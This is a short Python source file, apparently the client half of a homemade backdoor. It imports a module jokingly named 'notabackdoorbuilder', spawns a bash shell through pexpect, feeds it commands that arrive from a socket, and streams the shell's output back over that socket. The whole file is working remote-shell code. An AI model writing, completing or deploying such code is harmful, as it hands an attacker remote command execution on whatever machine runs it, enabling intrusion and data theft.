import notabackdoorbuilder
import threading
import pexpect
import time

def handle_output(context, callback):
	print("`handle_output` started...")
	while True:
		shell = context.get("shell")
		shell.expect(".+")
		context["output_buffer"] = shell.before.decode()
		callback(context)

def handle_new_output(context):
	output_buffer = context.get("output_buffer")
	sock = context.get("socket")
	print(f"\n{output_buffer}")
	sock.send(output_buffer.encode())
	if "%n@%m %1~ %#" in output_buffer:
		sock.send("\u0003".encode())
		print(f"\n\n\n\n[snet]\n\n\n")

def handle_command(context):
	print("Handling command...")
	if not context.get("shell"):
		print("Creating shell...")
		context["shell"] = pexpect.spawn("bash")
		context["output_buffer"] = ""
		context["output_thread"] = threading.Thread(target=handle_output, args=(context, handle_new_output))
		context["output_thread"].start()
		time.sleep(0.1)
		context["shell"].sendline("")
	shell = context.get("shell")
	shell.sendline(context.get("data").strip())
	print(f"Sent [{context.get('data')}] to shell.")

notabackdoorbuilder.handle_setup("client")

def main():
	pass
